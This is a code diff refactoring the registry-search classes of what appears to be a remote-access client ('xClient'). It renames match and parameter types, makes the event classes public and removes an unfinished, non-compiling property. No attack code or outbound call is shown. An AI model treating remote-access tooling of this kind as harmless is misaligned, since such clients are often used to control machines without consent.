@@ -1,85 +1,30 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.Linq;
-using System.Text;
-using System;
-using System.Collections.Generic;
 using System.ComponentModel;
 using System.Security;
 using Microsoft.Win32;
 using System.Threading;
-using xClient.Enums;
 using xClient.Core.Extensions;
 
 namespace xClient.Core.Registry
 {
-    private class RegSearchMatch
+    public class MatchFoundEventArgs : EventArgs
     {
-        public RegistryKey[] RootKeys { get; set; }
+        public RegSeekerMatch Match { get; private set; }
 
-        public string Key { get; private set; }
-        public string Value { get; private set; }
-        public string Data { get; private set; }
-
-        public RegSearchMatch(params RegistryKey[] rootKeys)
-        {
-            RootKeys = rootKeys;
-        }
-
-        public RegSearchMatch(string key, string value, string data)
-        {
-            Key = key;
-            Value = value;
-            Data = data;
-        }
-
-        public override string ToString()
-        {
-            return String.Format("({0}:{1}:{2})", Key, Value, Data);
-        }
-    }
-
-    class MatchFoundEventArgs : EventArgs
-    {
-        public RegSearchMatch Match { get; private set; }
-
-        public MatchFoundEventArgs(RegSearchMatch match)
+        public MatchFoundEventArgs(RegSeekerMatch match)
         {
             Match = match;
         }
     }
 
-    private class SearchCompletedEventArgs : EventArgs
+    public class SearchCompletedEventArgs : EventArgs
     {
-        public List<RegSearchMatch> Matches { get; private set; }
+        public List<RegSeekerMatch> Matches { get; private set; }
 
-        public SearchCompletedEventArgs(List<RegSearchMatch> matches)
+        public SearchCompletedEventArgs(List<RegSeekerMatch> matches)
         {
             Matches = matches;
-        }
-
-        public RegistryKey GetKeys
-        {
-            get
-            {
-                if (Matches == null || Matches.Count < 1)
-                {
-                    return null;
-                }
-                else
-                {
-                    List<RegistryKey> registryKeys = new List<RegistryKey>();
-                    foreach (RegSearchMatch match in Matches)
-                    {
-                        try
-                        {
-                            // Gather the registry keys.
-                        }
-                        catch
-                        { }
-                    }
-                }
-            }
         }
     }
 
@@ -126,9 +71,12 @@ namespace xClient.Core.Registry
         /// <summary>
         /// The search arguments to use for customizable registry searching.
         /// </summary>
-        public RegSearchMatch searchArgs;
+        public RegistrySeekerParams searchArgs;
 
-        private List<RegSearchMatch> matches;
+        /// <summary>
+        /// The list containing the matches found during the search.
+        /// </summary>
+        private List<RegSeekerMatch> matches;
 
         /// <summary>
         /// The queue of registry key paths to analyze further.
@@ -146,17 +94,17 @@ namespace xClient.Core.Registry
             searcher.ProgressChanged += new ProgressChangedEventHandler(worker_ProgressChanged);
         }
 
-        public void Start(RegSearchMatch args)
+        public void Start(RegistrySeekerParams args)
         {
             searchArgs = args;
 
-            matches = new List<RegSearchMatch>();
+            matches = new List<RegSeekerMatch>();
             searcher.RunWorkerAsync();
         }
 
         void worker_ProgressChanged(object sender, ProgressChangedEventArgs e)
         {
-            MatchFound(this, new MatchFoundEventArgs((RegSearchMatch)e.UserState));
+            MatchFound(this, new MatchFoundEventArgs((RegSeekerMatch)e.UserState));
         }
 
         public void Stop()
@@ -254,7 +202,7 @@ namespace xClient.Core.Registry
 
         private void AddMatch(string key, string value, string data)
         {
-            RegSearchMatch match = new RegSearchMatch(key, value, data);
+            RegSeekerMatch match = new RegSeekerMatch(key, value, data);
 
             if (MatchFound != null)
                 searcher.ReportProgress(0, match);
